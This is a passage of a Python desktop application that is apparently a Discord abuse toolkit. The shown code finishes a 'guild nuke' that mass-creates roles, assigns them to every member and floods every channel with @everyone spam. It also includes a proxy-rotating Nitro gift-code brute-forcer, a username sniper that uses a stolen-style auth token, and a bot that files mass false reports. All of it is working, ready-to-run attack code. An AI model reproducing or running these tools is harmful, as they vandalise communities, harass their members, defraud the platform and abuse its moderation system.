            self.log("[PHASE 4] Creating 10 roles 'cooked'...", "nuke")
            colors = [0xff0000, 0xff4500, 0xff8c00, 0xffd700, 0xadff2f, 0x00ff00, 0x00ced1, 0x1e90ff, 0x9400d3, 0xff1493]
            for i in range(10):
                if self.stop_flags.get("guild_nuker"): break
                payload = {"name": "cooked", "color": colors[i], "hoist": True, "mentionable": True, "permissions": "0"}
                for attempt in range(10):
                    try:
                        r = requests.post(f"{API}/guilds/{gid}/roles", headers=h, json=payload, timeout=10)
                        if r.status_code in [200, 201]:
                            rid = r.json()["id"]
                            with lock: created_roles.append(rid)
                            self.log(f"Created role {i+1}/10: cooked (color #{colors[i]:06x})", "success")
                            break
                        elif r.status_code == 429:
                            time.sleep(r.json().get("retry_after", 2) + random.random())
                        else:
                            self.log(f"Role {i+1} failed: {r.status_code}", "error")
                            break
                    except: time.sleep(1.5)
                time.sleep(0.6)
            self.log(f"Created {len(created_roles)} 'cooked' roles.", "nuke")

            if created_roles:
                self.log("[PHASE 5] Auto-assigning roles to ALL members...", "nuke")
                try:
                    members = []
                    after = "0"
                    while True:
                        r = requests.get(f"{API}/guilds/{gid}/members?limit=1000&after={after}", headers=h, timeout=15)
                        if r.status_code != 200: break
                        batch = r.json()
                        if not batch: break
                        members.extend(batch)
                        after = batch[-1]["user"]["id"]
                        if len(batch) < 1000: break

                    self.log(f"Found {len(members)} members. Assigning {len(created_roles)} roles each...", "nuke")

                    def assign_role(uid, rid):
                        for attempt in range(5):
                            try:
                                r = requests.put(f"{API}/guilds/{gid}/members/{uid}/roles/{rid}", headers=h, timeout=10)
                                if r.status_code in [200, 204]: return True
                                elif r.status_code == 429:
                                    time.sleep(r.json().get("retry_after", 1) + random.random())
                                else: return False
                            except: time.sleep(1)
                        return False

                    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
                        futures = []
                        for m in members:
                            uid = m["user"]["id"]
                            for rid in created_roles:
                                futures.append(ex.submit(assign_role, uid, rid))
                        concurrent.futures.wait(futures)
                    self.log(f"Assigned roles to all {len(members)} members.", "nuke")
                except Exception as e:
                    self.log(f"Role assignment error: {e}", "error")

            if not created_channels:
                self.log("No channels to spam. Nuke incomplete.", "error")
                return

            self.log(f"[PHASE 6] SPAM INITIATED — {len(created_channels)} channels", "nuke")
            spam_messages = [
                spam_msg,
                "@everyone ZOXZS",
                "@here cooked",
                "@everyone server is toast",
                "@here cooked by zoxz",
                "@everyone find a new server lol",
                "@here zoxz owns you",
                "@everyone this server is done",
                "@everyone @here goodbye",
                "☠️ NUKED BY ZOXZS ☠️",
                "cooked",
                "zoxz was here",
            ]

            def spam_channel(cid, name_hint=""):
                count = 0
                fails = 0
                while not self.stop_flags.get("guild_nuker"):
                    msg = random.choice(spam_messages)
                    delivered = False
                    for attempt in range(20):
                        try:
                            r = requests.post(f"{API}/channels/{cid}/messages", headers=h, json={"content": msg, "tts": random.choice([True, False])}, timeout=10)
                            if r.status_code in [200, 201]:
                                count += 1
                                delivered = True
                                if count % 25 == 0:
                                    self.log(f"Channel {name_hint}: {count} msgs delivered", "success")
                                break
                            elif r.status_code == 429:
                                wait = r.json().get("retry_after", 1) + random.uniform(0.5, 1)
                                time.sleep(wait)
                            elif r.status_code == 403:
                                fails += 1
                                if fails >= 5:
                                    self.log(f"Channel {name_hint}: Persistent 403, stopping.", "error")
                                    return
                                time.sleep(2)
                            else:
                                time.sleep(1)
                        except:
                            time.sleep(1.5)
                    if not delivered:
                        fails += 1
                        if fails >= 10:
                            self.log(f"Channel {name_hint}: Too many failures, stopping.", "error")
                            return
                    time.sleep(random.uniform(0.3, 0.8))
                self.log(f"Channel {name_hint}: spammer stopped at {count} msgs", "warn")

            with concurrent.futures.ThreadPoolExecutor(max_workers=len(created_channels)) as ex:
                futures = [ex.submit(spam_channel, cid, f"#{i+1}") for i, cid in enumerate(created_channels)]
                concurrent.futures.wait(futures)

            self.log("GUILD NUKE COMPLETE", "nuke")
            self.status_label.configure(text="Nuke Complete")

        threading.Thread(target=task, daemon=True).start()
        self.status_label.configure(text="NUKING...")

    def panel_generators(self):
        frame = ctk.CTkScrollableFrame(self.panel_container, fg_color=CARD, corner_radius=14)
        frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(frame, text="Nitro Generator", font=FONTS["header"], text_color=ACCENT).grid(row=0, column=0, columnspan=4, sticky="w", padx=18, pady=(18, 8))
        self.gen_threads = self.entry_row(frame, "Threads:", "1", row=1)
        self.gen_webhook = self.entry_row(frame, "Webhook for hits (opt):", "", row=2)
        self.gen_proxies = ctk.CTkCheckBox(frame, text="Use Proxies", font=FONTS["body"], text_color=TEXT)
        self.gen_proxies.grid(row=3, column=1, sticky="w", padx=12, pady=6)
        bf = ctk.CTkFrame(frame, fg_color="transparent")
        bf.grid(row=4, column=0, columnspan=4, pady=12)
        self.action_btn(bf, "Start", self.run_nitro_gen, row=0, col=0)
        self.action_btn(bf, "Stop", self.stop_tool, color=WARN, hover="#d97706", row=0, col=1)

        ctk.CTkLabel(frame, text="Bot Invite Generator", font=FONTS["header"], text_color=ACCENT).grid(row=5, column=0, columnspan=4, sticky="w", padx=18, pady=(28, 8))
        self.gen_botid = self.entry_row(frame, "Bot Client ID:", "", row=6)
        self.action_btn(frame, "Generate Link", self.run_bot_invite, row=7, col=1)

        ctk.CTkLabel(frame, text="4-Char Username Checker", font=FONTS["header"], text_color=ACCENT).grid(row=8, column=0, columnspan=4, sticky="w", padx=18, pady=(28, 8))
        self.gen_uname_tok = self.entry_row(frame, "Auth Token:", "", row=9, show="•")
        self.gen_uname_threads = self.entry_row(frame, "Threads:", "1", row=10)
        self.gen_uname_prox = ctk.CTkCheckBox(frame, text="Use Proxies", font=FONTS["body"], text_color=TEXT)
        self.gen_uname_prox.grid(row=11, column=1, sticky="w", padx=12, pady=6)
        bf2 = ctk.CTkFrame(frame, fg_color="transparent")
        bf2.grid(row=12, column=0, columnspan=4, pady=12)
        self.action_btn(bf2, "Start", self.run_username_check, row=0, col=0)
        self.action_btn(bf2, "Stop", self.stop_tool, color=WARN, hover="#d97706", row=0, col=1)

    def run_nitro_gen(self):
        try: tc = int(self.gen_threads.get() or 1)
        except: tc = 1
        wh = self.gen_webhook.get().strip()
        use_p = self.gen_proxies.get()
        self.stop_flags["nitro"] = False
        self.nitro_stats = {"v": 0, "i": 0, "r": 0, "e": 0}
        lock = threading.Lock()
        pxs = []
        if use_p:
            srcs = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
            for s in srcs:
                try:
                    r = requests.get(s, timeout=5)
                    if r.status_code == 200:
                        for l in r.text.splitlines():
                            if ":" in l: pxs.append(l.strip())
                except: pass
            pxs = list(set(pxs))
            self.log(f"Loaded {len(pxs)} proxies.")
        def _chk():
            while not self.stop_flags.get("nitro"):
                c = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
                url = f"https://discord.gift/{c}"
                p = random.choice(pxs) if use_p and pxs else None
                prox = {"http": f"http://{p}", "https": f"http://{p}"} if p else None
                try:
                    r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{c}?with_application=false&with_subscription_plan=true", proxies=prox, timeout=7)
                    with lock:
                        if r.status_code == 200:
                            self.nitro_stats["v"] += 1
                            self.log(f"VALID: {url}", "success")
                            with open("hits.txt", "a") as f: f.write(f"{url}\n")
                            if wh: requests.post(wh, json={"content": f"Nitro Valid! {url}"}, timeout=5)
                        elif r.status_code == 429: self.nitro_stats["r"] += 1
                        elif r.status_code == 404: self.nitro_stats["i"] += 1
                        else: self.nitro_stats["e"] += 1
                except:
                    with lock: self.nitro_stats["e"] += 1
                with lock:
                    self.status_label.configure(text=f"Nitro — V:{self.nitro_stats['v']} | I:{self.nitro_stats['i']} | 429:{self.nitro_stats['r']} | E:{self.nitro_stats['e']}")
                if not use_p: time.sleep(1)
        for _ in range(tc): threading.Thread(target=_chk, daemon=True).start()
        self.log(f"Nitro generator started ({tc} threads).")

    def run_bot_invite(self):
        bid = self.gen_botid.get().strip()
        if not bid: self.log("Client ID required.", "error"); return
        link = f"https://discord.com/oauth2/authorize?client_id={bid}&scope=bot&permissions=8"
        self.log(f"Link: {link}", "success")
        if messagebox.askyesno("Open Browser?", "Open the invite link?"): webbrowser.open(link)

    def run_username_check(self):
        auth = self.gen_uname_tok.get().strip()
        if not auth: self.log("Auth token required.", "error"); return
        try: tc = int(self.gen_uname_threads.get() or 1)
        except: tc = 1
        use_p = self.gen_uname_prox.get()
        self.stop_flags["username"] = False
        stats = {"hits": 0, "taken": 0, "ratelimited": 0, "error": 0}
        lock = threading.Lock()
        chars = string.ascii_lowercase + string.digits
        proxies_list = []
        if use_p:
            if os.path.exists("input/proxies.txt"):
                with open("input/proxies.txt", "r", encoding="utf-8") as f: proxies_list = [l.strip() for l in f if ":" in l]
                self.log(f"Loaded {len(proxies_list)} proxies.")
            else:
                srcs = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
                for url in srcs:
                    try:
                        resp = requests.get(url, timeout=6)
                        if resp.status_code == 200:
                            for line in resp.text.split("\n"):
                                if ":" in line: proxies_list.append(line.strip())
                    except: pass
                proxies_list = list(set(proxies_list))
                self.log(f"Scraped {len(proxies_list)} proxies.")
        def _worker():
            while not self.stop_flags.get("username"):
                name = "".join(random.choice(chars) for _ in range(4))
                proxy_addr = random.choice(proxies_list) if use_p and proxies_list else None
                proxies = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None
                headers = {"Authorization": auth, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                try:
                    import urllib3
                    urllib3.disable_warnings()
                    r = requests.post(f"{API}/users/@me/pomelo-attempt", headers=headers, json={"username": name}, proxies=proxies, timeout=8, verify=False)
                    if r.status_code == 200:
                        data = r.json()
                        if data.get("taken") == False:
                            with lock: stats["hits"] += 1
                            self.log(f"UNCLAIMED: {name}", "success")
                            with open("output/4chars.txt", "a") as f: f.write(name + "\n")
                        else:
                            with lock: stats["taken"] += 1
                    elif r.status_code == 429:
                        with lock: stats["ratelimited"] += 1
                        time.sleep(r.json().get("retry_after", 3))
                    elif r.status_code == 401:
                        self.log("TOKEN INVALID! Stopping.", "error")
                        self.stop_flags["username"] = True
                        return
                    else:
                        with lock: stats["error"] += 1
                except:
                    with lock: stats["error"] += 1
                with lock:
                    self.status_label.configure(text=f"4Char — Avail:{stats['hits']} | Taken:{stats['taken']} | 429:{stats['ratelimited']} | Err:{stats['error']}")
        for _ in range(tc): threading.Thread(target=_worker, daemon=True).start()
        self.log(f"Username checker started ({tc} threads).")

    def panel_utilities(self):
        frame = ctk.CTkScrollableFrame(self.panel_container, fg_color=CARD, corner_radius=14)
        frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(frame, text="ID to Token (Base64)", font=FONTS["header"], text_color=ACCENT).grid(row=0, column=0, columnspan=3, sticky="w", padx=18, pady=(18, 8))
        self.util_uid = self.entry_row(frame, "User ID:", "123456789012345678", row=1)
        self.action_btn(frame, "Convert", self.run_id_to_token, row=2, col=1)

        ctk.CTkLabel(frame, text="Report Bot", font=FONTS["header"], text_color=ACCENT).grid(row=3, column=0, columnspan=3, sticky="w", padx=18, pady=(28, 8))
        self.util_rtok = self.entry_row(frame, "Token:", "", row=4, show="•")
        self.util_rgid = self.entry_row(frame, "Guild ID:", "", row=5)
        self.util_rcid = self.entry_row(frame, "Channel ID:", "", row=6)
        self.util_rmid = self.entry_row(frame, "Message ID:", "", row=7)
        ctk.CTkLabel(frame, text="Reason: 1=Illegal 2=Harassment 3=Spam 4=Self-harm 5=NSFW", font=FONTS["small"], text_color=MUTED).grid(row=8, column=0, columnspan=3, sticky="w", padx=18)
        self.util_rreason = self.entry_row(frame, "Reason (1-5):", "1", row=9)
        self.util_ramt = self.entry_row(frame, "Amount:", "100", row=10)
        self.action_btn(frame, "Send Reports", self.run_report_bot, color=ERROR, hover="#dc2626", row=11, col=1)

    def run_id_to_token(self):
        uid = self.util_uid.get().strip()
        if not uid: self.log("User ID required.", "error"); return
        try:
            tok = base64.b64encode(uid.encode()).decode()
            self.log(f"Base64: {tok}", "success")
        except Exception as e: self.log(f"Error: {e}", "error")

    def run_report_bot(self):
        tk = self.util_rtok.get().strip()
        gid = self.util_rgid.get().strip()
        cid = self.util_rcid.get().strip()
        mid = self.util_rmid.get().strip()
        try: rsn = int(self.util_rreason.get() or 1)
        except: rsn = 1
        try: amt = int(self.util_ramt.get() or 100)
        except: amt = 100
        if not all([tk, gid, cid, mid]): self.log("All fields required.", "error"); return
        def _do():
            h = {"Authorization": tk, "Content-Type": "application/json", "User-Agent": "Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0"}
            payload = {"channel_id": cid, "message_id": mid, "guild_id": gid, "reason": rsn}
            for i in range(amt):
                try:
                    r = requests.post("https://discordapp.com/api/v8/report", headers=h, json=payload, timeout=10)
                    if r.status_code == 201: self.log(f"Report {i+1}/{amt} sent.", "success")
                    else: self.log(f"Report {i+1} failed: {r.status_code}", "error")
                except Exception as e: self.log(f"Report {i+1} error: {e}", "error")
                time.sleep(0.05)
            self.log("Report batch complete.", "success")
        threading.Thread(target=_do, daemon=True).start()
        self.log(f"Initializing {amt} reports...")

if __name__ == "__main__":
    app = ZoxzsApp()
    app.mainloop()
